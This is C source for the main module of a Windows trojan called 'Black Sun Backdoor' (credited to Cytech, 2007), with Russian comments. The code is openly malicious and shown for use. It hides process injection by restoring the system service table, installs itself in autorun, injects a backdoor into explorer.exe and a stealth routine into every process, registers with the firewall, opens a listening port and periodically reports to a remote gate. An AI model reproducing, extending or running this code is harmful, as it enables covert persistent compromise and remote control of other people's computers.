/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [blacksun.c]
 *      main-функции :)
 *  ---------------------------------------------------------------------
 *    thnx to: 
 *         Cr4sh//0x48k, el-//0x48k, gorl, xhack//0x48k, Bill//TPOC 
 *  ---------------------------------------------------------------------
 */
 
#include	"headers.h"

// ---------------------------------------------------------------------------------------
// эта функция запускает сплайсинг во всех DLL зараженного процесса и в самом процессе
// + подгружает модули без которых ничего работать не будет (imagehlp.dll и остальные)
// ---------------------------------------------------------------------------------------

static DWORD WINAPI StealthMain(LPVOID lpParam) 
{
	
	LoadLibrary(KERNEL32_DLL);	// 1
	LoadLibrary(ADVAPI32_DLL);	// 2
	LoadLibrary(IMGHLP_DLL);	// 3
	LoadLibrary(SHELL32_DLL);	// 4
	LoadLibrary(WS2_32_DLL);	// 5
	LoadLibrary(URLMON_DLL); 	// 6
	LoadLibrary(WININET_DLL);	// 7
	LoadLibrary(WINMM_DLL);		// 8
	LoadLibrary(USER32_DLL);	// 9

	Stealth();
	
	return 0;
}
// -----------------------------------------------------------------------------------------
// этот код будет инжектироваться в explorer.exe и представляет собой основное тело бэкдора
// -----------------------------------------------------------------------------------------

static DWORD WINAPI BackdoorMain(LPVOID lpParam) 
{
	HANDLE 	hBindBackdoorThread, 
			hzDownloaderThread;

	StealthMain(NULL); 
		#ifdef NETSHADD
		NetSHFirewallReg(); 				// регаемся в netsh файре
		#endif NETSHADD
		InitWinSock2API();  		// инициализируем WinSock2 API 
									// создаем поток бэкдора
		hBindBackdoorThread = StartThread(Backdoor_Listen, (short)BINDPORT);    

		  while(TRUE)
		  {
				// проверяем коннект к интернету... если нет, то спим 1 минуту и проверяем снова
				if (CheckInternetConnection() == 0)
				{
					Sleep(1*60*1000); 
					continue;
				} 
				// если подключены, то создаем поток отправки инфы на гейт, затем спим указанное время
				// (по умолчанию 15 минут), затем продолжаем в том же духе
				else if (CheckInternetConnection() == 1)
				{
					#ifdef USEGATE
					hzDownloaderThread  = StartThread(ReportToStat, NULL);
					#endif USEGAGE
					Sleep(HTTPFREQ*60*1000);
					
				}
		  }

    return TRUE; 	
}

// ---------------------------------------------------------------------------------------
// тред для инжекта в explorer.exe
// ---------------------------------------------------------------------------------------

DWORD WINAPI StartExplorerInjThread(LPVOID lParam) 
{
	StartProcInject(NULL, FIRSTINJPROC, BackdoorMain); 
	return 0;
}

// ---------------------------------------------------------------------------------------
// тред для инжекта во все процессы
// ---------------------------------------------------------------------------------------

DWORD WINAPI StartAllProcInjThread(LPVOID lParam)
{
	InjectAllProcesses(StealthMain);
	return FALSE;
}

// ---------------------------------------------------------------------------------------
// гоп-стоп... мы подошли из-за угла :D
// ---------------------------------------------------------------------------------------

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	
	HANDLE 	hExplorerInj, 
			hAllProcInj; 
			
	__try
		{
				PDWORD deadcoded = 0;
				*deadcoded = 0xd34dc0d3d;
		} 
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
	
			// восстанавливаем SST, чтобы не спалить инжект.
			//  за эту фичу прежде всего стоит поблагодарить Cr4sh :)
				ReadSST((PDWORD)&sst);
				CallR0((DWORD)&R0Func);
				
				//прописываемся в автозагрузку (run) и копируемся system32
				
			     AddSelfToRun("addtorun");
				 
				// позволяем запуститься только 1 копии трояна с помощью создания mutex
				
			    CreateMutex(NULL,FALSE, MUTEXNAME);
				
				// если mutex уже создан, то вырубаемся (значит мы уже не первые)
				
				if(GetLastError() == ERROR_ALREADY_EXISTS)
				{
					ExitProcess(0);
				}

			// инжектирую код бэкдора в FIRSTINJPROC теперь работаем из под его имени.
				hExplorerInj = StartThread(StartExplorerInjThread, NULL);
	
			// заражаю все остальные процессы.
		         hAllProcInj = StartThread(StartAllProcInjThread, NULL);
		 }
	
			return 0;

} 
// -------------------------------------------------------------//
//  Darkcoded by Cytech/0x48k, (x) 2007, hellknights.void.ru    //
// -------------------------------------------------------------//